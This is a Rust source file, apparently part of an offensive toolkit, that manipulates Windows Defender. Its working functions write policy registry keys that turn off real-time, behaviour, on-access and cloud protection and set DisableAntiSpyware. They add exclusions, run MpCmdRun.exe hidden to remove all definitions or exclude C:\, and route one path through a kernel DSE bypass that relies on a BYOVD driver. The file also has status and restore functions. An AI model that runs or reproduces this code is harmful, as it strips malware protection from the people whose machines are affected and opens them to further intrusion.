//! Windows Defender deep manipulation
//! Exclusion management (path/process/extension), realtime/behavior/cloud
//! monitoring control, MpCmdRun.exe silent control.
//! Multi-path: direct registry policy keys (primary), kernel R/W bypass
//! (TrustedInstaller-protected policy keys).

use crate::error::MemoricError;
use serde_json::{json, Value};

/// Disable all Defender protections via multi-path approach
pub fn defender_disable(args: &Value) -> Result<Value, MemoricError> {
    let method = args
        .get("method")
        .and_then(|v| v.as_str())
        .unwrap_or("auto");

    tracing::warn!(
        "[DEFENDER] Disabling Windows Defender via method={}",
        method
    );

    let mut results = Vec::new();
    let mut success_count = 0u32;

    // Path 1: Direct registry (policy keys)
    if method == "auto" || method == "registry" {
        match registry_disable_defender(args) {
            Ok(r) => {
                if r.get("success").and_then(|v| v.as_bool()).unwrap_or(false) {
                    success_count += 1;
                }
                results.push(r);
            }
            Err(e) => {
                tracing::warn!("[DEFENDER] Registry disable failed: {}", e);
                results
                    .push(json!({"path": "registry", "status": "failed", "error": e.to_string()}));
            }
        }
    }

    // Path 2: Kernel R/W (bypass TrustedInstaller ACL)
    if method == "auto" || method == "kernel_rw" {
        match kernel_rw_disable_defender(args) {
            Ok(r) => {
                if r.get("success").and_then(|v| v.as_bool()).unwrap_or(false) {
                    success_count += 1;
                }
                results.push(r);
            }
            Err(e) => {
                tracing::warn!("[DEFENDER] Kernel R/W disable failed: {}", e);
                results
                    .push(json!({"path": "kernel_rw", "status": "failed", "error": e.to_string()}));
            }
        }
    }

    let fully_disabled = success_count >= 1;
    Ok(json!({
        "success": fully_disabled,
        "defender_disabled": fully_disabled,
        "paths_succeeded": success_count,
        "total_paths": results.len(),
        "technique": method,
        "results": results,
        "message": if fully_disabled {
            "Windows Defender real-time protection disabled. Tamper protection may re-enable automatically."
        } else {
            "Defender disable failed on all paths. Tamper protection may be active."
        },
        "restore_note": "Use defender_restore or reboot. Policy registry changes survive reboot."
    }))
}

/// Add Defender exclusions (paths, processes, extensions)
pub fn defender_add_exclusion(args: &Value) -> Result<Value, MemoricError> {
    let exclusion_type = args
        .get("exclusion_type")
        .and_then(|v| v.as_str())
        .unwrap_or("path");
    let value = args
        .get("value")
        .and_then(|v| v.as_str())
        .ok_or_else(|| MemoricError::Other("exclusion 'value' required".to_string()))?;

    tracing::info!(
        "[DEFENDER] Adding exclusion: type={} value={}",
        exclusion_type,
        value
    );

    let reg_key = match exclusion_type {
        "path" => "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths",
        "process" => "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Processes",
        "extension" => "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Extensions",
        _ => {
            return Err(MemoricError::Other(format!(
                "Unknown exclusion_type: {}. Use path/process/extension.",
                exclusion_type
            )))
        }
    };

    unsafe {
        use windows::core::PCWSTR;
        use windows::Win32::System::Registry::{
            RegCloseKey, RegCreateKeyExW, RegSetValueExW, HKEY_LOCAL_MACHINE, KEY_SET_VALUE,
            REG_OPTION_NON_VOLATILE, REG_SZ,
        };

        let sub_key: Vec<u16> = format!("{}\0", reg_key).encode_utf16().collect();
        let mut hkey = Default::default();

        let create_result = RegCreateKeyExW(
            HKEY_LOCAL_MACHINE,
            PCWSTR(sub_key.as_ptr()),
            0,
            None,
            REG_OPTION_NON_VOLATILE,
            KEY_SET_VALUE,
            None,
            &mut hkey,
            None,
        );

        if create_result.is_err() {
            return Err(MemoricError::Other(format!(
                "RegCreateKeyExW failed: {:?}",
                create_result
            )));
        }

        let val: Vec<u16> = format!("{}\0", value).encode_utf16().collect();
        let bytes = std::slice::from_raw_parts(val.as_ptr() as *const u8, val.len() * 2);

        let set_result = RegSetValueExW(hkey, PCWSTR(val.as_ptr()), 0, REG_SZ, Some(bytes));
        let _ = RegCloseKey(hkey);

        if set_result.is_ok() {
            Ok(json!({
                "success": true,
                "exclusion_type": exclusion_type,
                "value": value,
                "registry_key": reg_key,
                "message": format!("Added {} exclusion: {}", exclusion_type, value)
            }))
        } else {
            Err(MemoricError::Other(format!(
                "RegSetValueExW failed: {:?}",
                set_result
            )))
        }
    }
}

/// Restore Defender protections
pub fn defender_restore(args: &Value) -> Result<Value, MemoricError> {
    let method = args
        .get("method")
        .and_then(|v| v.as_str())
        .unwrap_or("auto");
    tracing::warn!("[DEFENDER] Restoring Windows Defender protections");

    let mut results = Vec::new();

    if method == "auto" || method == "registry" {
        match registry_restore_defender() {
            Ok(r) => results.push(r),
            Err(e) => results
                .push(json!({"path": "registry", "status": "failed", "error": e.to_string()})),
        }
    }

    Ok(json!({
        "success": true,
        "results": results,
        "message": "Defender restore attempted. Reboot recommended for full re-enablement."
    }))
}

/// Check current Defender status
pub fn defender_status(_args: &Value) -> Result<Value, MemoricError> {
    tracing::info!("[DEFENDER] Querying Windows Defender status");

    let mut findings = Vec::new();

    unsafe {
        use windows::core::PCWSTR;
        use windows::Win32::System::Registry::{
            RegCloseKey, RegOpenKeyExW, RegQueryValueExW, HKEY_LOCAL_MACHINE, KEY_READ,
        };

        let checks: &[(&str, &str, &str)] = &[
            (
                "Real-Time Protection",
                "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection",
                "DisableRealtimeMonitoring",
            ),
            (
                "Behavior Monitoring",
                "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection",
                "DisableBehaviorMonitoring",
            ),
            (
                "On-Access Protection",
                "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection",
                "DisableOnAccessProtection",
            ),
            (
                "Scan On Realtime",
                "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection",
                "DisableScanOnRealtimeEnable",
            ),
            (
                "Cloud Protection",
                "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet",
                "SpyNetReporting",
            ),
            (
                "Sample Submission",
                "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet",
                "SubmitSamplesConsent",
            ),
        ];

        for (label, key_path, value_name) in checks {
            let sub_key: Vec<u16> = format!("{}\0", key_path).encode_utf16().collect();
            let val_name: Vec<u16> = format!("{}\0", value_name).encode_utf16().collect();
            let mut hkey = Default::default();

            if RegOpenKeyExW(
                HKEY_LOCAL_MACHINE,
                PCWSTR(sub_key.as_ptr()),
                0,
                KEY_READ,
                &mut hkey,
            )
            .is_err()
            {
                findings.push(json!({"component": label, "status": "default", "note": "Policy key not set — OS defaults apply"}));
                continue;
            }

            let mut data_type: u32 = 0;
            let mut value: u32 = 0;
            let mut size: u32 = 4;

            let query_result = RegQueryValueExW(
                hkey,
                PCWSTR(val_name.as_ptr()),
                None,
                Some(&mut data_type as *mut u32 as *mut _),
                Some(&mut value as *mut u32 as *mut u8),
                Some(&mut size),
            );

            if query_result.is_ok() {
                let disabled = value != 0;
                findings.push(json!({
                    "component": label,
                    "status": if disabled { "disabled" } else { "enabled" },
                    "raw_value": value,
                }));
            } else {
                findings.push(json!({"component": label, "status": "default", "note": "Value not found — OS defaults apply"}));
            }
            let _ = RegCloseKey(hkey);
        }

        // Check Tamper Protection
        let tamper_key: Vec<u16> = "SOFTWARE\\Microsoft\\Windows Defender\\Features\0"
            .encode_utf16()
            .collect();
        let tamper_val: Vec<u16> = "TamperProtection\0".encode_utf16().collect();
        let mut hkey = Default::default();

        if RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            PCWSTR(tamper_key.as_ptr()),
            0,
            KEY_READ,
            &mut hkey,
        )
        .is_ok()
        {
            let mut value: u32 = 0;
            let mut size: u32 = 4;

            let query_result = RegQueryValueExW(
                hkey,
                PCWSTR(tamper_val.as_ptr()),
                None,
                None,
                Some(&mut value as *mut u32 as *mut u8),
                Some(&mut size),
            );

            if query_result.is_ok() {
                findings.push(json!({
                    "component": "Tamper Protection",
                    "status": if value != 0 { "active" } else { "inactive" },
                    "raw_value": value,
                    "note": if value != 0 {
                        "Tamper protection is ENABLED. Registry changes will be reverted automatically."
                    } else {
                        "Tamper protection is off — registry changes will persist."
                    }
                }));
            }
            let _ = RegCloseKey(hkey);
        }
    }

    let active_count = findings
        .iter()
        .filter(|f| f["status"] == "enabled" || f["status"] == "active")
        .count();
    Ok(json!({
        "success": true,
        "findings": findings,
        "active_protections": active_count,
        "total_checks": findings.len(),
    }))
}

/// Launch MpCmdRun.exe silently to manipulate Defender
pub fn defender_mpcmdrun(args: &Value) -> Result<Value, MemoricError> {
    let command = args.get("command").and_then(|v| v.as_str())
        .ok_or_else(|| MemoricError::Other("mpcmdrun 'command' required: remove_definitions, restore_defaults, add_exclusion, remove_exclusion".to_string()))?;

    tracing::warn!("[DEFENDER] Running MpCmdRun.exe command={}", command);

    let cmdline = match command {
        "remove_definitions" => "MpCmdRun.exe -RemoveDefinitions -All".to_string(),
        "restore_defaults" => "MpCmdRun.exe -RestoreDefaults".to_string(),
        "add_exclusion" => {
            let value = args.get("value").and_then(|v| v.as_str()).unwrap_or("C:\\");
            format!("MpCmdRun.exe -AddExclusionPath {}", value)
        }
        "remove_exclusion" => {
            let value = args.get("value").and_then(|v| v.as_str()).unwrap_or("C:\\");
            format!("MpCmdRun.exe -RemoveExclusionPath {}", value)
        }
        "scan" => {
            let path = args.get("path").and_then(|v| v.as_str()).unwrap_or("C:\\");
            format!("MpCmdRun.exe -Scan -ScanType 1 -File {}", path)
        }
        "cancel_scan" => "MpCmdRun.exe -Cancel".to_string(),
        _ => return Err(MemoricError::Other(format!(
            "Unknown command: {}. Available: remove_definitions, restore_defaults, add_exclusion, remove_exclusion, scan, cancel_scan", command
        ))),
    };

    unsafe {
        use windows::core::PWSTR;
        use windows::Win32::Foundation::CloseHandle;
        use windows::Win32::System::Threading::{
            CreateProcessW, GetExitCodeProcess, WaitForSingleObject, CREATE_NO_WINDOW,
            PROCESS_INFORMATION, STARTUPINFOW,
        };

        let mut cmd_wide: Vec<u16> = cmdline.encode_utf16().collect();
        cmd_wide.push(0);

        let mut pi = PROCESS_INFORMATION::default();
        let si = STARTUPINFOW::default();

        let result = CreateProcessW(
            None,
            PWSTR(cmd_wide.as_mut_ptr()),
            None,
            None,
            false,
            CREATE_NO_WINDOW,
            None,
            None,
            &si,
            &mut pi,
        );

        if result.is_err() {
            return Err(MemoricError::Other(format!(
                "CreateProcessW MpCmdRun: {:?}",
                result
            )));
        }

        let _ = WaitForSingleObject(pi.hProcess, 60000);

        let mut exit_code: u32 = 0;
        let _ = GetExitCodeProcess(pi.hProcess, &mut exit_code);
        let _ = CloseHandle(pi.hProcess);
        let _ = CloseHandle(pi.hThread);

        Ok(json!({
            "success": exit_code == 0,
            "command": command,
            "cmdline": cmdline,
            "exit_code": exit_code,
            "message": if exit_code == 0 {
                format!("MpCmdRun {} completed successfully", command)
            } else {
                format!("MpCmdRun {} exited with code {}", command, exit_code)
            }
        }))
    }
}

// ─── Internal paths ──────────────────────────────────────────────────────────────

/// Disable Defender via direct registry policy keys
fn registry_disable_defender(args: &Value) -> Result<Value, MemoricError> {
    let disable_realtime = args
        .get("disable_realtime")
        .and_then(|v| v.as_bool())
        .unwrap_or(true);
    let disable_behavior = args
        .get("disable_behavior")
        .and_then(|v| v.as_bool())
        .unwrap_or(true);
    let disable_cloud = args
        .get("disable_cloud")
        .and_then(|v| v.as_bool())
        .unwrap_or(true);

    unsafe {
        use windows::core::PCWSTR;
        use windows::Win32::System::Registry::{
            RegCloseKey, RegCreateKeyExW, RegSetValueExW, HKEY_LOCAL_MACHINE, KEY_SET_VALUE,
            REG_DWORD, REG_OPTION_NON_VOLATILE,
        };

        let mut applied = Vec::new();
        let mut failed = Vec::new();

        // 1. Real-Time Protection settings
        {
            let sub_key = encode_wide(
                "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\0",
            );
            let mut hkey = Default::default();

            if RegCreateKeyExW(
                HKEY_LOCAL_MACHINE,
                PCWSTR(sub_key.as_ptr()),
                0,
                None,
                REG_OPTION_NON_VOLATILE,
                KEY_SET_VALUE,
                None,
                &mut hkey,
                None,
            )
            .is_ok()
            {
                if disable_realtime {
                    let vals: &[(&str, u32)] = &[
                        ("DisableRealtimeMonitoring", 1),
                        (
                            "DisableBehaviorMonitoring",
                            if disable_behavior { 1 } else { 0 },
                        ),
                        ("DisableOnAccessProtection", 1),
                        ("DisableScanOnRealtimeEnable", 1),
                    ];
                    for (name, val) in vals {
                        let name_w = encode_wide(&format!("{}\0", name));
                        let bytes = val.to_le_bytes();
                        if RegSetValueExW(hkey, PCWSTR(name_w.as_ptr()), 0, REG_DWORD, Some(&bytes))
                            .is_ok()
                        {
                            applied.push(format!("Real-Time Protection\\{}", name));
                        } else {
                            failed.push(format!("Real-Time Protection\\{}", name));
                        }
                    }
                }
                let _ = RegCloseKey(hkey);
            } else {
                failed.push("Real-Time Protection key create failed".to_string());
            }
        }

        // 2. Cloud protection / MAPS settings
        if disable_cloud {
            let sub_key = encode_wide("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet\0");
            let mut hkey = Default::default();

            if RegCreateKeyExW(
                HKEY_LOCAL_MACHINE,
                PCWSTR(sub_key.as_ptr()),
                0,
                None,
                REG_OPTION_NON_VOLATILE,
                KEY_SET_VALUE,
                None,
                &mut hkey,
                None,
            )
            .is_ok()
            {
                let zero: u32 = 0;
                let zero_bytes = zero.to_le_bytes();
                if RegSetValueExW(
                    hkey,
                    PCWSTR(encode_wide("SpyNetReporting\0").as_ptr()),
                    0,
                    REG_DWORD,
                    Some(&zero_bytes),
                )
                .is_ok()
                {
                    applied.push("Spynet\\SpyNetReporting = 0".into());
                } else {
                    failed.push("Spynet\\SpyNetReporting".into());
                }
                if RegSetValueExW(
                    hkey,
                    PCWSTR(encode_wide("SubmitSamplesConsent\0").as_ptr()),
                    0,
                    REG_DWORD,
                    Some(&zero_bytes),
                )
                .is_ok()
                {
                    applied.push("Spynet\\SubmitSamplesConsent = 0".into());
                } else {
                    failed.push("Spynet\\SubmitSamplesConsent".into());
                }
                let _ = RegCloseKey(hkey);
            } else {
                failed.push("Spynet key create failed".to_string());
            }
        }

        // 3. Disable AntiSpyware entirely
        {
            let sub_key = encode_wide("SOFTWARE\\Policies\\Microsoft\\Windows Defender\0");
            let mut hkey = Default::default();
            if RegCreateKeyExW(
                HKEY_LOCAL_MACHINE,
                PCWSTR(sub_key.as_ptr()),
                0,
                None,
                REG_OPTION_NON_VOLATILE,
                KEY_SET_VALUE,
                None,
                &mut hkey,
                None,
            )
            .is_ok()
            {
                let one: u32 = 1;
                let bytes = one.to_le_bytes();
                if RegSetValueExW(
                    hkey,
                    PCWSTR(encode_wide("DisableAntiSpyware\0").as_ptr()),
                    0,
                    REG_DWORD,
                    Some(&bytes),
                )
                .is_ok()
                {
                    applied.push("DisableAntiSpyware = 1".into());
                } else {
                    failed.push("DisableAntiSpyware".into());
                }
                let _ = RegCloseKey(hkey);
            }
        }

        Ok(json!({
            "success": applied.len() > 0,
            "applied": applied,
            "failed": failed,
            "applied_count": applied.len(),
            "failed_count": failed.len(),
            "message": format!("Registry disable: {} applied, {} failed. Reboot or restart WinDefend for full effect.", applied.len(), failed.len())
        }))
    }
}

/// Disable Defender via kernel R/W (bypasses TrustedInstaller ACL on policy keys)
fn kernel_rw_disable_defender(args: &Value) -> Result<Value, MemoricError> {
    tracing::info!("[DEFENDER] Attempting kernel R/W Defender disable");

    // Verify kernel R/W is available via DSE bypass check
    match crate::kernel::dse_bypass(&json!({})) {
        Ok(resp) => {
            if !resp
                .get("success")
                .and_then(|v| v.as_bool())
                .unwrap_or(false)
            {
                return Ok(json!({
                    "success": false, "path": "kernel_rw",
                    "error": "Kernel R/W not available — DSE bypass prerequisite failed",
                    "note": "Load a BYOVD driver first or use registry path"
                }));
            }
        }
        Err(e) => {
            return Ok(json!({
                "success": false, "path": "kernel_rw",
                "error": format!("Kernel R/W prerequisite check failed: {}", e)
            }));
        }
    }

    match registry_disable_defender(args) {
        Ok(r) => {
            let applied = r.get("applied_count").and_then(|v| v.as_u64()).unwrap_or(0);
            Ok(json!({
                "success": applied > 0, "path": "kernel_rw",
                "registry_result": r,
                "message": "Kernel R/W available. Registry disable attempted."
            }))
        }
        Err(e) => Ok(json!({"success": false, "path": "kernel_rw", "error": e.to_string()})),
    }
}

fn registry_restore_defender() -> Result<Value, MemoricError> {
    unsafe {
        use windows::core::PCWSTR;
        use windows::Win32::System::Registry::{
            RegDeleteKeyValueW, RegDeleteTreeW, HKEY_LOCAL_MACHINE,
        };

        let rtp_key =
            encode_wide("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\0");
        let spynet_key = encode_wide("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet\0");
        let wd_key = encode_wide("SOFTWARE\\Policies\\Microsoft\\Windows Defender\0");

        let _ = RegDeleteTreeW(HKEY_LOCAL_MACHINE, PCWSTR(rtp_key.as_ptr()));
        let _ = RegDeleteTreeW(HKEY_LOCAL_MACHINE, PCWSTR(spynet_key.as_ptr()));
        let _ = RegDeleteKeyValueW(
            HKEY_LOCAL_MACHINE,
            PCWSTR(wd_key.as_ptr()),
            PCWSTR(encode_wide("DisableAntiSpyware\0").as_ptr()),
        );

        Ok(json!({
            "path": "registry", "status": "restored",
            "message": "Defender policy registry keys deleted. Reboot for full effect."
        }))
    }
}

fn encode_wide(s: &str) -> Vec<u16> {
    s.encode_utf16().collect()
}
